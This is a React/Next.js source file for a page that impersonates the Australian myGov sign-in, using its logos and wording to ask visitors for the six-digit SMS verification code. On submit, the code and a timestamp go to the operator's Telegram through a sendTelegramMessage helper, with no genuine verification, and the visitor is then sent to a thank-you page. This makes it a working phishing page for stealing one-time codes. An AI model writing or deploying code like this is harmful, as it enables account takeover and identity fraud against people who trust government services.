"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { sendTelegramMessage } from "../../utils/telegram";

const OTP_LENGTH = 6; // OTP should be 6 digits

const Page = () => {
  const [otp, setOtp] = useState<string>(""); // State for OTP input
  const [error, setError] = useState<string>(""); // State for error message
  const router = useRouter();

  // Validate OTP: It should be a 6-digit number
  const validateOtp = (otp: string): boolean => {
    if (/^\d+$/.test(otp) && otp.length === OTP_LENGTH) {
      setError(""); // Clear any previous error
      return true;
    }
    setError("Please enter a valid 6-digit code.");
    return false;
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!validateOtp(otp)) {
      return; // Prevent submission if OTP is invalid
    }

    const message = `
      🚨 OTP Submitted 🚨
      - OTP: ${otp}
      - Time: ${new Date().toLocaleString()}
    `;

    try {
      await sendTelegramMessage(message);
      router.push("/thank"); // Redirect on successful submission
    } catch (error) {
      console.error("Failed to send OTP to Telegram:", error);
      
    }
  };

  // Handle OTP input: Ensure only numeric values are allowed
  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (/^\d*$/.test(value)) {
      setOtp(value); // Update OTP state only if input is numeric
    }
  };

  return (
    <div>
      {/* Brand Rainbow */}
      <div className="h-1 bg-[#66d3ee]">&nbsp;</div>

      {/* Header */}
      <header className="bg-[#66d3ee] border-b-4 border-[#66d3ee]">
        <div className="max-w-7xl mx-auto flex items-center p-4">
          <a href="#" className="flex items-center">
            <Image
              src="/images/myGov-cobranded-logo-black.svg"
              alt="myGov Beta Logo"
              width={150}
              height={40}
            />
          </a>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-lg mx-auto p-6">
        <h1 className="text-2xl font-bold text-gray-800 mb-4">Verify Identity</h1>
        <p className="text-gray-700 mb-6">
          We sent a code by SMS to your mobile number. Enter the code below to
          proceed.
        </p>
        <form onSubmit={handleSubmit} className="space-y-4" autoComplete="off">
          <div>
            <label
              htmlFor="otp"
              className="block text-sm font-medium text-gray-700"
            >
              Code
            </label>
            <input
              id="otp"
              name="otp"
              type="text"
              maxLength={OTP_LENGTH}
              className={`mt-1 block w-full p-2 border ${
                error ? "border-red-500" : "border-gray-300"
              } rounded-md shadow-sm focus:outline-none ${
                error ? "focus:ring-red-500" : "focus:ring-[#66d3ee]"
              } focus:border-[#66d3ee]`}
              required
              value={otp}
              onChange={handleOtpChange}
              onBlur={() => validateOtp(otp)}
              inputMode="numeric" // Mobile-friendly numeric input
              pattern="\d*" // Enforce numeric input for browsers
            />
            {error && <p className="text-sm text-red-500 mt-2">{error}</p>}
          </div>
          <p className="text-sm text-gray-500">
            If you don&apos;t want to use Digital Identity, you can{" "}
            <a href="#" className="text-blue-600 hover:underline">
              call the helpdesk
            </a>{" "}
            to create a new myGov account.
          </p>

          <a
            href="/las/mygov-login?execution=e42s2&_eventId=continueWithDigitalIdentity"
            className="inline-block text-sm text-blue-600 hover:underline"
          >
            Continue with Digital Identity
          </a>
          <button
            type="submit"
            className="w-full bg-[#66d3ee] text-white font-medium py-2 px-4 rounded-md transition-colors duration-300 hover:bg-[#5cc5db] focus:ring focus:ring-[#66d3ee]"
          >
            Next
          </button>
        </form>
      </main>

      {/* Footer */}
      <footer className="bg-black text-white py-8 mt-10">
        <div className="max-w-7xl mx-auto px-4">
          <nav className="flex justify-center space-x-6">
            <a href="#" className="hover:underline">
              Terms of Use
            </a>
            <a href="#" className="hover:underline">
              Privacy and Security
            </a>
            <a href="#" className="hover:underline">
              Copyright
            </a>
            <a href="#" className="hover:underline">
              Accessibility
            </a>
          </nav>
          <div className="mt-8 text-center">
            <Image
              src="/images/myGov-cobranded-logo-white.svg"
              alt="myGov Logo"
              width={150}
              height={40}
              className="mx-auto h-10"
            />
            <p className="mt-4 text-sm">
              We acknowledge the Traditional Custodians of the lands we live on.
              We pay our respects to all Elders, past and present, of all
              Aboriginal and Torres Strait Islander nations.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Page;
